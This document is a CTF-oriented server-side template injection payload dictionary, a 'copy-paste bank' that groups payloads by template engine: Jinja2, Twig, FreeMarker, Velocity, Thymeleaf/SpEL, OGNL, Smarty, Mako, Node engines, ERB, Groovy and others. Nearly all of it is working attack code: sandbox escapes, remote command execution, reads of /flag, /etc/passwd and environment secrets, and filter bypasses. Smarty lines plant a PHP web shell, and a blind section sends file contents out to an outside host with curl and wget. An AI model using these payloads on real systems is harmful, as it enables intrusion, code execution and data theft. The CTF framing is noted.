# SSTI payload dictionary — the categorized corpus

Every payload a CTF SSTI needs, by intent. Engine-specific
procedures live in the engine files; this is the copy-paste bank.

---

## 1. Detection markers — first probe per syntax family

```text
{{7*7}}          -- {{ }} family: jinja/twig/nunjucks/handlebars
${7*7}           -- $ {} family: freemarker/mako/el/velocity-ish
<%= 7*7 %>       -- <% %> family: erb/ejs/jsp
#{7*7}           -- #{} family: pug/thymeleaf/ognl
*{7*7}           -- thymeleaf selection
{{=7*7}}         -- doT
${7*7}#set       -- velocity prefix
{%=7*7%}         -- liquid-ish
[[${7*7}]]       -- thymeleaf inline
@((7*7))         -- razor
```

## 2. Engine-discrimination set — inject all, read which fires

```text
{{7*7}}          → 49: {{}}-family   → try: {{7*'7'}}
{{7*'7'}}        → 7777777: Jinja2   → 49: Twig/Nunjucks
${7*7}           → 49: FreeMarker/Mako/EL/Velocity-ish
<%= 7*7 %>       → 49: ERB/EJS/JSP
#{7*7}           → 49: Pug/Thymeleaf/OGNL
{{'a'+'b'}}      → ab: Jinja2/Nunjucks (Twig errors)
{{'a'~'b'}}      → ab: Jinja2/Twig (Nunjucks errors)
a{*x*}z          → az: Jinja2 ({* *} comment)
a{#x#}z          → az: Twig/Jinja2 ({# #} comment)
{{7**7}}         → 823543: Jinja2 (Twig errors?)
{{x.y.z}}        → error text names engine
{{7/0}}          → error text names engine
```

## 3. Jinja2 — the full bank

### eval-confirm
```jinja2
{{7*7}} {{7*'7'}} {{7**7}} {{"a"+"b"}} {{"a"~"b"}}
{{range(5)|list}}  {{'x'*10}}  {{[1,2,3]|sum}}  {{loop}}
```

### context-dump (flag often right here)
```jinja2
{{config}}
{{config.items()}}
{{config['SECRET_KEY']}}
{{config['FLAG']}}
{{self}}
{{self._TemplateReference__context}}
{{session}}
{{request}}
{{request.args}}
{{request.cookies}}
{{request.environ}}
{{g}}
{{lipsum.__globals__}}
{{url_for.__globals__.current_app.config}}
{{app}}
{{app.config}}
{{app.jinja_env.globals}}
{{get_flashed_messages}}
{{namespace}}
```

### subclasses-walk (needs index)
```jinja2
{{''.__class__}}
{{''.__class__.__mro__}}
{{''.__class__.__mro__[1]}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{''.__class__.__mro__[1].__subclasses__()|length}}
{{''.__class__.__mro__[-1].__subclasses__()}}
{{[].__class__.__base__.__subclasses__()}}
{{{}.__class__.__base__.__subclasses__()}}
{{().__class__.__base__.__subclasses__()}}
{{"".__class__.__bases__[0].__subclasses__()}}
```

### subclasses enumeration (find Popen index)
```jinja2
{%for c in ''.__class__.__mro__[1].__subclasses__()%}{{loop.index}} {{c}}{%endfor%}
{%for c in ''.__class__.__mro__[1].__subclasses__()%}{%if 'Popen' in c.__name__%}{{loop.index}}{%endif%}{%endfor%}
{%for c in ''.__class__.__mro__[1].__subclasses__()%}{%if 'warn' in c.__name__%}{{loop.index}}:{{c}}{%endif%}{%endfor%}
```

### RCE — the working chains
```jinja2
{{''.__class__.__mro__[1].__subclasses__()[N].__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()[N].__init__.__globals__.os.popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()[N].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()[N]('id',shell=True,stdout=-1).communicate()[0].strip()}}
{{lipsum.__globals__['os'].popen('id').read()}}
{{lipsum.__globals__.os.popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{joiner.__init__.__globals__.os.popen('id').read()}}
{{namespace.__init__.__globals__.os.popen('id').read()}}
{{url_for.__globals__['os'].popen('id').read()}}
{{self.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

### File read
```jinja2
{{lipsum.__globals__['__builtins__'].open('/flag').read()}}
{{get_flashed_messages.__globals__['__builtins__'].open('/flag').read()}}
{{url_for.__globals__.__builtins__.open('/flag').read()}}
{{config.from_pyfile('/flag')}}
{{''.__class__.__mro__[1].__subclasses__()[N].__init__.__globals__['__builtins__'].open('/etc/passwd').read()}}
{{self._TemplateReference__context}}   -- context-dump as read
```

### bypass-shapes
```jinja2
{{''|attr('__class__')}}
{{''['__class__']}}
{{''['__cl'+'ass__']}}
{{''|attr('\x5f\x5fclass\x5f\x5f')}}
{{''|attr(request.args.a)}}&a=__class__
{{''[dict(__class__=x)|list|first]}}
{{''.__clclassass__}}                    -- double-write
{{''.__cla__class__ss__}}                 -- nested-double-write
{%set x='__class__'%}{{''[x]}}
{%if 7*7==49%}OK{%endif%}
{%print(7*7)%}
{{request.args.f(request.args.a)}}&f=eval&a=__import__('os').popen('id').read()
{{x|attr('__init__')}}                    -- attr() filter always
```

## 4. Twig

```twig
{{7*7}} {{7*'7'}}
{{_context}}
{{dump()}}
{{app.user}} {{app.request}} {{app.environment}}
{{app.request.server.get('DOCUMENT_ROOT')}}
{{app.request.query.all}}
{{constant('FLAG')}} {{constant('APP_SECRET')}} {{constant('DB_PASSWORD')}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("cat /flag")}}
{{['id']|map('system')|join}}
{{['cat /flag']|map('system')|join}}
{{['id']|filter('system')|join}}
{{['id']|sort('system')}}
{{['id']|reduce('system')}}
{{['id']|map('sys'~'tem')|join}}
{{['id']|map(app.request.query.get('f'))|join}}&f=system
{{source('/etc/passwd')}}
{{source('/flag')}}
{{include('/etc/passwd')}}
{{include('../../flag')}}
{{include('php://filter/convert.base64-encode/resource=/flag')}}
{{app.kernel.projectDir}}
```

## 5. FreeMarker

```ftl
${7*7}
${.version} ${.now} ${.vars} ${.data_model['flag']}
${"freemarker.template.utility.Execute"?new()("id")}
${"freemarker.template.utility.Execute"?new()("cat /flag")}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /flag")}
<#assign ot="freemarker.template.utility.ObjectConstructor"?new()>${ot("java.lang.ProcessBuilder","id").start()}
${"x"?api.getClass()}
${"x"?api.getClass().forName("java.lang.Runtime")}
<#include "/etc/passwd">
<#include "/flag">
<#include "../../../etc/passwd">
<#import "/etc/passwd" as x>
${request.getParameter('x')}
${rc.getContext()}
```

## 6. Velocity

```velocity
#set($x=7*7)${x}
${7*7}
$x.class
$x.class.forName('java.lang.Runtime').getRuntime().exec('id')
#set($x="")#set($c=$x.class)#set($r=$c.forName('java.lang.Runtime').getRuntime())$r.exec('id')
$x.class.forName('java.lang.Runtime').getMethod('exec',$x.class.forName('java.lang.String')).invoke($x.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')
$context.keys
$class.inspect($x)
$request.getSession().getAttribute('flag')
#include('/etc/passwd')
#include('/flag')
#parse('/etc/passwd')
#evaluate($x)
$esc.java
$request
```

## 7. Thymeleaf/SpEL

```thymeleaf
*{7*7}
${7*7}
*{T(java.lang.Runtime).getRuntime().exec('id')}
*{T(java.lang.Runtime).getRuntime().exec('cat /flag')}
*{new java.util.Scanner(new java.io.File('/flag')).next()}
*{new java.util.Scanner(new java.io.FileInputStream('/flag')).useDelimiter('\\Z').next()}
*{new String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('/flag')))}
*{T(org.apache.commons.io.IOUtils).toString(new java.io.FileInputStream('/flag'))}
*{T(java.lang.ClassLoader).getSystemResource('/flag')}
*{new java.lang.String(T(org.springframework.util.StreamUtils).copyToString(new java.io.FileInputStream('/flag'),T(java.nio.charset.Charset).defaultCharset()))}
__${x}__                            -- preprocessing wrap
```

## 8. OGNL/Struts

```ognl
%{7*7}
${7*7}
%{@java.lang.Runtime@getRuntime().exec('id')}
%{#rt=@java.lang.Runtime@getRuntime(),#rt.exec('id')}
%{new java.lang.ProcessBuilder('id').start()}
%{#context['xwork.MethodAccessor.denyMethodExecution']=false,#rt=@java.lang.Runtime@getRuntime(),#rt.exec('id')}
%{(#_='x').(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(@java.lang.Runtime@getRuntime().exec('id'))}
%{@java.lang.Class@forName('java.lang.Runtime')}
```

## 9. Smarty

```smarty
{7*7}
{$smarty.version}
{$smarty.const.FLAG}
{$smarty.const.APP_KEY}
{$smarty.server.DOCUMENT_ROOT}
{$smarty.session}
{$smarty.get.x}
{php}system('id');{/php}
{php}echo `cat /flag`;{/php}
{php}echo file_get_contents('/flag');{/php}
{if system('id')}{/if}
{if `id`}{/if}
{eval var='{php}system("id"){/php}'}
{'id'|system}
{'cat /flag'|exec:$o}{$o}
{Smarty_Internal_Runtime_WriteFile::writeFile('/var/www/html/x.php','<?php system($_GET[c]);',null)}
{Smarty_Internal_Write_File::writeFile('/tmp/x.php','<?php system($_GET[c]);')}
{include file='/etc/passwd'}
{include file='/flag'}
{include file='file:///flag'}
{$smarty.template_object->smarty->disableSecurity()}
{fetch file='/etc/passwd'}
```

## 10. Mako

```mako
${7*7}
${__import__('os').popen('id').read()}
${__import__('os').popen('cat /flag').read()}
${__import__('os').system('id')}
${open('/flag').read()}
${open('/etc/passwd').read()}
${__import__('subprocess').check_output('id',shell=True)}
${context.keys()}
${context.get('flag')}
${self.module.__dict__}
${request.params}
${request.registry.settings}
<% import os; x=os.popen('id').read() %>${x}
${getattr('','__cl'+'ass__')}
${''.__class__.__mro__[1].__subclasses__()}
<%include file='/etc/passwd'/>
<%include file='/flag'/>
```

## 11. Node engines — nunjucks/ejs/pug/handlebars/dot

```javascript
// nunjucks:
{{7*7}} {{7*'7'}}
{{this.constructor.constructor('return process')()}}
{{this.constructor.constructor('return process.env')()}}
{{this.constructor.constructor('return global.process.mainModule.require("child_process").execSync("id")')()}}
{{this.constructor.constructor('return global.process.mainModule.require("fs").readFileSync("/flag","utf8")')()}}
{{global}}
{{cycler.__init__.__globals__}}          -- jinja-lookalike? no —
                                          nunjucks ctx is JS —
                                          constructor chain only

// ejs:
<%= 7*7 %>
<%= process %>
<%= process.env %>
<%= process.env.FLAG %>
<%= global.process.mainModule.require('child_process').execSync('id') %>
<%= global.process.mainModule.require('fs').readFileSync('/flag','utf8') %>
<%= require('child_process').execSync('id') %>
<%= this.constructor.constructor('return process')() %>
<% process.stdout.write('XSS_PROBE') %>
<%- x %>                                 -- unescaped out — XSS

// pug:
#{7*7}
#{global.process.env}
#{global.process.mainModule.require('child_process').execSync('id')}
#{this.constructor.constructor('return process')()}
#{function(){return global.process.mainModule.require('fs').readFileSync('/flag','utf8')}()}

// handlebars:
{{this}} {{@root}} {{@global}}
{{lookup this 'constructor'}}
{{#each this}}{{@key}}={{this}} {{/each}}
{{x | json}}
{{this.__proto__}}                         -- 4.x gated
{{#with "x" as |x|}}{{x.constructor.constructor('return process')()}}{{/with}}

// doT:
{{=7*7}}
{{=global.process}}
{{=global.process.mainModule.require('child_process').execSync('id')}}
{{?7*7===49}}yes{{?}}
```

## 12. Ruby — ERB/Slim/Haml/Liquid

```erb
<%= 7*7 %>
<%= `id` %>
<%= `cat /flag` %>
<%= system('id') %>
<%= File.read('/flag') %>
<%= File.open('/flag').read %>
<%= Dir['/*'] %>
<%= ENV %>
<%= ENV['FLAG'] %>
<%= params %> <%= session %> <%= cookies %> <%= flash %>
<%= @flag %> <%= @user.password %>
<%= Rails.application.credentials %>
<%= Rails.root %>
<%= User.first %>
<%= ActiveRecord::Base.connection.execute('SELECT * FROM flag') %>
<%= ''.send(:instance_eval,'`id`') %>
<%= ObjectSpace.each_object(String).select{|s|s=~/flag/} %>
<% `id` %>
```

```slim
= 7*7
= `id`
= File.read('/flag')
= ENV['FLAG']
= `cat /flag`
```

```haml
= 7*7
= `id`
= File.read('/flag')
```

```liquid
{{7|times:7}}
{{user}} {{user|json}} {{user.password}}
{{settings}}
{{site}}
{{x|map:'password'}}
{{x|inspect}}
{{x|where:'admin',true}}
{{'a'|append:'b'}}
{{forloop}}
```

## 13. Groovy

```groovy
${7*7}
${'id'.execute()}
${'id'.execute().text}
${'cat /flag'.execute().text}
${new File('/flag').text}
${Runtime.getRuntime().exec('id')}
${["sh","-c","cat /flag"].execute().text}
<%= 'id'.execute().text %>                -- GSP
<% Runtime.getRuntime().exec('id') %>
```

## 14. Pebble/Jinjava — java-jinja

```java
{{7*7}}
{{'a'.getClass()}}
{{'a'.getClass().forName('java.lang.Runtime')}}
{{'a'.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}}
{{''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getRuntime(),'id')}}
{{request}}
{{context}}
```

## 15. The OOB/blind set — no output visible

```jinja2
{{lipsum.__globals__.os.popen('curl https://me/?d=`cat /flag|base64`').read()}}
{{lipsum.__globals__.os.popen('wget -qO- https://me/`cat /flag`').read()}}
{{''.__class__.__mro__[1].__subclasses__()[N].__init__.__globals__.os.popen('curl me/`id|base64`').read()}}
```

```twig
{{['curl https://me/?d=`cat /flag|base64`']|map('system')|join}}
{{['wget -qO- https://me/`cat /flag`']|map('system')|join}}
```

```mako
${__import__('os').popen('curl me/?d=`cat /flag`')}
${__import__('urllib.request').request.urlopen('https://me/?d='+open('/flag').read())}
```

```groovy
${'curl me/?d=$(cat /flag|base64)'.execute()}
${new URL('https://me/'+new File('/flag').text).text}
```

## 16. The error-induction set — force the engine to confess

```text
{{nonexistent.x.y.z}}
{{7/0}}
{{{{
{{x|nonexistentfilter}}
{% for %}
${x..y}
<%=
#{null.thing}
```

Watch the stack-trace for the engine name and the line where your
value landed — the error context often reveals the surrounding
template syntax (which `th:` attr, which wrapper).
## 17. The subclass-index hunter bank — Jinja2 one-shots

The subclasses() list is ordered — indexes shift by loaded libs.
Fire the MAP first, then pick by NAME not index.

```jinja2
{%for c in ''.__class__.__mro__[1].__subclasses__()%}
{{loop.index}}|{{c.__name__}}|{{c.__module__}}|
{%endfor%}
```

Then the name-lookups (no index needed):

```jinja2
{{''.__class__.__mro__[1].__subclasses__()|selectattr('__name__','equalto','Popen')|list}}
{{''.__class__.__mro__[1].__subclasses__()|selectattr('__name__','equalto','catch_warnings')|list}}
{{''.__class__.__mro__[1].__subclasses__()|selectattr('__name__','equalto','_wrap_close')|list}}
{{x.__init__.__globals__['__builtins__']['eval']('__import__("os").popen("id").read()')}}
{{x.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}
{{x.__init__.__globals__['os'].popen('id').read()}}
{{x.__init__.__globals__['sys'].modules['os'].popen('id').read()}}
{{x.__init__.__globals__['builtins'].open('/flag').read()}}
{{x.__init__.__globals__['builtins']['open']('/flag').read()}}
{{x.__init__.__globals__['builtins']['eval']('open("/flag").read()')}}
```

## 18. The lipsum/cycler/joiner bank — Flask's bound helpers

```jinja2
{{lipsum.__globals__}}
{{lipsum.__globals__['os']}}
{{lipsum.__globals__['os']['popen']('id')['read']()}}
{{lipsum.__globals__.os.popen('id').read()}}
{{lipsum.__globals__.os.environ}}
{{lipsum.__globals__.os.environ['FLAG']}}
{{lipsum.__globals__.sys.modules}}
{{lipsum.__globals__.sys.modules['os'].popen('id').read()}}
{{lipsum.__globals__['__builtins__']}}
{{lipsum.__globals__['__builtins__']['open']('/flag').read()}}
{{lipsum.__globals__['__builtins__'].eval('__import__("os").environ')}}
{{cycler.__init__}}
{{cycler.__init__.__globals__}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{joiner.__init__.__globals__}}
{{joiner.__init__.__globals__.os.popen('id').read()}}
{{namespace.__init__.__globals__}}
{{namespace.__init__.__globals__.os.popen('id').read()}}
{{range.__globals__}}
{{cycler.next}} {{joiner.join}}
```

## 19. The self/context bank — no subclass-hunt

```jinja2
{{self}}
{{self._TemplateReference__context}}
{{self._TemplateReference__context.vars}}
{{self._TemplateReference__context.cycles}}
{{self._TemplateReference__context.environment}}
{{self.__init__}}
{{self.__init__.__globals__}}
{{self.__init__.__globals__['__builtins__']}}
{{self.__init__.__globals__.os.popen('id').read()}}
{{self.module}}
{{self.module.__dict__}}
{{self.environment}}
{{self.environment.globals}}
{{self.blocks}}
{{self.root_render_func}}
{{self.root_render_func.__globals__}}
{{_context}}
{{_context['flag']}} {{_context.flag}}
{{_context.items()}}
{{_context.keys()}}
{{_context|join(',')}}
{{_context|sort}}
{{_context.keys()|list}}
```

## 20. The Flask-object bank — request/session/g/config

```jinja2
{{request}}
{{request.args}} {{request.args.items()}}
{{request.form}} {{request.values}}
{{request.cookies}} {{request.cookies.items()}}
{{request.headers}} {{request.headers.items()}}
{{request.environ}} {{request.environ.items()}}
{{request.environ['werkzeug.server.shutdown']()}}
{{request.application}}
{{request.application.__globals__}}
{{request.application.__globals__['os'].popen('id').read()}}
{{request.application.__call__}}
{{request.application.__call__.__globals__}}
{{request.__class__}}
{{request.__class__.__init__.__globals__}}
{{session}}
{{session.items()}} {{session['flag']}} {{session.get('flag')}}
{{g}} {{g.flag}} {{g.get('flag')}}
{{config}}
{{config['FLAG']}} {{config.FLAG}} {{config.get('FLAG')}}
{{config.from_pyfile('/flag')}}
{{config.items()}} {{config.keys()}}
{{url_for}}
{{url_for.__globals__}}
{{url_for.__globals__.current_app}}
{{url_for.__globals__.current_app.config}}
{{url_for.__globals__.current_app.config['SECRET_KEY']}}
{{get_flashed_messages}}
{{get_flashed_messages.__globals__}}
{{get_flashed_messages.__globals__.current_app.config}}
{{get_template_attribute}}
{{get_template_attribute.__globals__}}
```

## 21. The attr-accessor bank — the four spellings

```jinja2
{{x.y}}                    — dot — the normal
{{x['y']}}                 — bracket — works on dicts+objects
{{x|attr('y')}}            — the attr filter — getattrs
{{x.__getattribute__('y')}} — the raw accessor — always present
{{getattr(x,'y')}}          — if getattr bound — global-reach
{{x['__class__']}}          — dunder via brackets — bypasses some
                              .-filters
{{x|attr('__'+'class'+'__')}} — concat attr-name
{{x|attr(request.args.a)}}  — attr-name from param
```

## 22. The string-source bank — when quotes die

```jinja2
{{request.args.x}}                        — param-carried
{{request.values.x}}                       — merged params
{{request.cookies.x}}                      — cookie-carried
{{request.headers.x}}                      — header-carried
{{request.form.x}}                         — form-field
{{dict(__class__=v)|first}}                 — '__class__' as key!
{{dict(__globals__=v)|first}}                — '__globals__' as key
{{dict(os=v)|first}}                          — 'os' as key
{{dict(c='l',a='a',s='s')|join}}               — dict-vals joined
{{'%c%c%c%c%c%c%c%c'|format(95,95,99,108,97,115,115)}}
   — chr-built '__class__' — 95=_ 99=c 108=l 97=a 115=s
{{lipsum|string|list}}                          — lipsum → chars
{{lipsum|string|list|join}}                     — back to string
{{config|string|list}}                            — config-as-text
{{self|string|list}}                              — self-as-text
{{lipsum|string|wordlist}}                        — word-split
{{x|string|list|first}}                             — first-char
{{x|string|list|last}}
{{x|string|list|join('/')}}
```

`dict(k=v)|first` — dict-keys preserve order — `|first`/`|join`
extract the KEYS as strings — the no-quotes string-builder.

## 23. The `{% %}`-statement bank — when `{{}}` dies

```jinja2
{%set x=7*7%}{{x}}
{%set x='a'+'b'%}{{x}}
{%set x='__cl'+'ass__'%}
{%set f=lipsum.__globals__.os.popen%}{{f('id').read()}}
{%set g=lipsum['__globals__']%}{{g.os.popen('id').read()}}
{%set k='__globals__'%}{{lipsum[k]}}
{%set k='__globals__'%}{{lipsum[k]['os']['popen']('id')['read']()}}
{%if 7*7==49%}YES{%endif%}
{%if 7*7%}T{%else%}F{%endif%}
{%for i in range(3)%}{{i}}{%endfor%}
{%for k,v in _context.items()%}{{k}}={{v}}<br>{%endfor%}
{%for c in ''.__class__.__mro__[1].__subclasses__()%}
{{loop.index}}|{{c.__name__}}|
{%endfor%}
{%with x=lipsum.__globals__%}{{x.os.popen('id').read()}}{%endwith%}
{%print(7*7)%}
{%print(lipsum.__globals__.os.popen('id').read())%}
{%print(config)%}
{%print(_context)%}
{%macro m(x)%}{{x}}{%endmacro%}{{m('hi')}}
{%set x='__cl'%}{%set x=x+'ass__'%}{{''[x]}}
   — build in steps across {%set%}
```

## 24. The Mako bank — `<% %>` statements + `${}`

```mako
${7*7}
${7*'7'}
${'a'.upper()}
${self}
${self.body()}
${self.attr}
${self.module}
${self.module.__dict__}
${self.module.__dict__['os']}
${context}
${context.keys()}
${context['x']}
${__import__('os')}
${__import__('os').popen('id').read()}
${__import__('os').environ}
<% import os %>${os.popen('id').read()}
<% import os %>
${os.popen('cat /flag').read()}
<% x=__import__('os'); y=x.popen('id').read() %>${y}
<%! import os %>
<%! import os
    def f(c): return os.popen(c).read()
%>${f('id')}
${open('/flag').read()}
${eval('open("/flag").read()')}
${exec('import os')}
```

Mako's `__import__` is often reachable directly — no sandbox.

## 25. The Tornado bank

```python
{{7*7}}
{{7*'7'}}
{{'a'.upper()}}
{% import os %}
{% import os %}{{os.popen('id').read()}}
{% import os %}{{os.system('cat /flag > /tmp/x')}}
{% import subprocess %}{{subprocess.check_output('id',shell=True)}}
{% module os.popen('id') %}
{{handler}}
{{handler.request}} {{handler.application}}
{{this}} {{_tt_modules}}
```

`{% import x %}` — the tornado-only import — full python.

## 26. The Velocity-bank detail

```velocity
#set($x=7*7)$x
#set($x=$x.class.forName('java.lang.Runtime'))
#set($r=$x.getMethod('getRuntime',null))
#set($rt=$r.invoke(null,null))
#set($e=$x.getMethod('exec',$x.class.forName('java.lang.String')))
$e.invoke($rt,'id')
$class
$class.inspect('java.lang.Runtime')
$class.inspect('java.lang.Runtime').type
$class.inspect('java.lang.Runtime').type.getRuntime()
$field
$field.in('java.lang.Runtime')
$render
$render.eval($ctx,"7*7")
$render.eval($ctx,"$x.class.forName('java.lang.Runtime').getRuntime().exec('id')")
$esc
$math
$math.toInteger("1")+1
$context
$context.keys
$request $response $session $application
$x.class.protectionDomain.classLoader
$x.class.protectionDomain.classLoader.loadClass('java.lang.Runtime')
$x.class.forName('java.util.Scanner')
$x.class.forName('java.util.Scanner').getConstructor($x.class.forName('java.io.File')).newInstance($x.class.forName('java.io.File').getConstructor($x.class.forName('java.lang.String')).newInstance('/flag'))
```

## 27. The FreeMarker deep bank

```ftl
${7*7}
${'a'?upper_case}
${x?api}
${x?api.getClass()}
${x?api.getClass().forName('java.lang.Runtime')}
${x?api.getClass().forName('java.lang.Runtime').getMethod('exec',''.class).invoke(x?api.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(),'id')}
${"freemarker.template.utility.Execute"?new()}
${"freemarker.template.utility.Execute"?new()("id")}
${"freemarker.template.utility.Execute"?new()("cat /flag")}
${"freemarker.template.utility.ObjectConstructor"?new()}
${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","id")}
${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","id").start()}
${"freemarker.template.utility.JythonRuntime"?new()}
${.data_model}
${.data_model?keys}
${.data_model.flag}
${.now} ${.version} ${.env} ${.main}
${.namespace}
<#include "/flag">
<#include "flag">
<#import "/flag" as x>
<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}
<#assign x="freemarker.template.utility.Execute"?new()>
<#assign e=x("cat /flag")>${e}
[#ftl]
[#assign x=7*7]${x}
```

## 28. The ERB bank

```ruby
<%=7*7%>
<%=7*'7'%>
<%='a'.upcase%>
<%=self%>
<%=self.class%>
<%=self.inspect%>
<%=self.methods%>
<%=self.methods.grep(/file|read|exec|open|eval|load/)%>
<%=ENV%>
<%=ENV['FLAG']%>
<%=ENV.to_h%>
<%=File.read('/flag')%>
<%=File.open('/flag').read%>
<%=File.open('/flag').readlines%>
<%=IO.read('/flag')%>
<%=IO.readlines('/flag')%>
<%=IO.binread('/flag')%>
<%=`id`%>
<%=`cat /flag`%>
<%=%x(id)%>
<%=%x(cat /flag)%>
<%=%w(cat /flag)%>
<%=system('cat /flag')%>
<%=exec('id')%>
<%=spawn('id')%>
<%=IO.popen('id').read%>
<%=IO.popen('cat /flag').read%>
<%=IO.popen('id').readlines%>
<%=Process.spawn('id')%>
<%=eval('File.read("/flag")')%>
<%=eval('`id`')%>
<%=Dir['/flag*']%>
<%=Dir.glob('/*')%>
<%=Dir.entries('/')%>
<%=Dir.entries('/app')%>
<%=Dir.pwd%>
<%=File.expand_path('.')%>
<%=File.absolute_path('app.rb')%>
<%=File.exist?('/flag')%>
<%=File.readable?('/flag')%>
<%=File.size('/flag')%>
<%=File.open('/flag').each_char.first(10)%>
<%=File.open('/flag','rb').read%>
<%=File.readlines('/flag').join%>
<%require 'open3'%>
<%=Open3.capture2('id').first%>
<%=Open3.capture3('id')%>
<%=Open3.popen3('id')%>
<%require 'socket'%>
<%=Socket.gethostname%>
<%=TCPSocket.new('you',80)%>
<%=request%>
<%=params%>
<%=cookies%>
<%=session%>
<%=flash%>
<%=@flag%>
<%=@x%>
<%=@user.password%>
<%=Rails.application%>
<%=Rails.application.config%>
<%=Rails.application.secrets%>
<%=Rails.root%>
<%=Rails.env%>
<%=raise 'x'%>
<%=raise File.read('/flag')%>
<%=raise File.read('/flag').inspect%>
<%=throw :x%>
<%=catch(:x){throw :x,File.read('/flag')}%>
```

`raise File.read()` — the error-page exfil — the exception
message IS the file — renders on the 500 page.

## 29. The Slim/Haml bank

```slim
#{7*7}
#{RUBY_VERSION}
#{ENV['FLAG']}
#{File.read('/flag')}
#{%x(cat /flag)}
#{`cat /flag`}
#{IO.popen('id').read}
#{Dir.entries('/')}
#{self} #{self.class}
#{params} #{request} #{session}
=#{7*7}
=File.read('/flag')
%p= File.read('/flag')
:ruby
  File.read('/flag')
```

## 30. The Pug bank

```pug
p=7*7
= 7*7
#{7*7}
#{process}
#{process.env}
#{process.env.FLAG}
#{global.process.mainModule.require('fs').readFileSync('/flag','utf8')}
#{global.process.mainModule.require('child_process').execSync('id')}
- var x = global.process
p #{x.env.FLAG}
- var fs = global.process.mainModule.require('fs')
p= fs.readFileSync('/flag','utf8')
p= JSON.stringify(process.env)
p= this
```
## 31. The Thymeleaf/SpEL bank

```java
*{7*7}
*{''.class} *{x.class}
*{T(java.lang.Runtime)}
*{T(java.lang.Runtime).getRuntime()}
*{T(java.lang.Runtime).getRuntime().exec('id')}
*{T(java.lang.Runtime).getRuntime().exec(new String[]{'sh','-c','cat /flag'})}
*{new java.util.Scanner(new java.io.File('/flag')).next()}
*{new java.lang.ProcessBuilder('id').start()}
*{T(java.lang.System).getenv()}
*{T(java.lang.System).getenv('FLAG')}
*{T(java.lang.System).getProperties()}
*{new String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('/flag')))}
*{T(org.apache.commons.io.IOUtils).toString(new java.io.FileInputStream('/flag'))}
*{T(org.springframework.util.StreamUtils).copyToString(new java.io.FileInputStream('/flag'),T(java.nio.charset.Charset).defaultCharset())}
*{beans}
*{beans.flagBean}
*{beans.environment}
*{beans.environment.getProperty('flag')}
*{beans.applicationContext}
*{beans.applicationContext.environment}
*{beans.applicationContext.getBean('x')}
__${7*7}__
__${''.class}__
__${T(java.lang.Runtime).getRuntime().exec('id')}__
__${T(java.lang.Runtime).getRuntime().exec('id')}__::x
*{request}
*{session}
*{servletContext}
*{ctx}
*{ctx.vars}
*{param}
*{param.flag}
*{session.flag}
*{application.flag}
*{#request}
*{#session}
*{#servletContext}
*{#ctx}
*{#ctx.vars}
*{#ctx.getVariable('flag')}
*{#request.getAttribute('flag')}
*{#session.getAttribute('flag')}
*{#locale} *{#themes}
*{T(org.springframework.web.context.support.WebApplicationContextUtils).getWebApplicationContext(#servletContext).getBean('flagBean')}
*{T(com.fasterxml.jackson.databind.ObjectMapper).writeValueAsString(#ctx)}
```

`#{x}` — message-source resolution — resolves message-CODES not
variables — different grammar from `*{x}`.

## 32. The OGNL bank

```ognl
%{7*7}
%{@java.lang.Runtime@getRuntime()}
%{@java.lang.Runtime@getRuntime().exec('id')}
%{@java.lang.Runtime@getRuntime().exec(new String[]{'sh','-c','cat /flag'})}
%{new java.util.Scanner(new java.io.File('/flag')).next()}
%{new java.lang.ProcessBuilder('id').start()}
%{@java.lang.System@getenv()}
%{@java.lang.System@getenv('FLAG')}
%{@java.lang.System@getProperty('os.name')}
%{#context}
%{#context['flag']}
%{#parameters}
%{#request}
%{#session}
%{#application}
%{#attr}
%{#request.flag} %{#session.flag}
%{#rt=@java.lang.Runtime@getRuntime(),#rt.exec('id')}
%{#rt=@java.lang.Runtime@getRuntime(),#p=new java.lang.ProcessBuilder('id'),#p.start()}
%{@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS}
%{#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec('id')}
%{#_memberAccess['allowStaticMethodAccess']=true,@java.lang.Runtime@getRuntime().exec('id')}
%{#context['xwork.MethodAccessor.denyMethodExecution']=false,@java.lang.Runtime@getRuntime().exec('id')}
%{#application}
%{#application.get('key')}
%{#session['key']}
```

The `_memberAccess`/`allowStaticMethodAccess` unlock — the
Struts2 classic — turn off the sandbox first, then `@static@method`.

## 33. The Groovy bank

```groovy
${7*7}
${'a'.execute()}
${'id'.execute()}
${'id'.execute().text}
${'cat /flag'.execute().text}
${['sh','-c','cat /flag'].execute().text}
${['cat','/flag'].execute().text}
${'id'.execute().inputStream.text}
${'id'.execute().getText()}
${'id'.execute().waitFor()}
${new File('/flag')}
${new File('/flag').text}
${new File('/flag').readLines()}
${new File('/flag').bytes}
${new String(new File('/flag').bytes)}
${new File('/flag').eachLine{println it}}
${new File('/flag').getText('UTF-8')}
${'/flag' as File}
${('/flag' as File).text}
${System.getenv()}
${System.getenv('FLAG')}
${System.getProperty('os.name')}
${System.properties}
${Runtime.getRuntime().exec('id')}
${Runtime.runtime.exec('id')}
${this.class}
${this.class.classLoader}
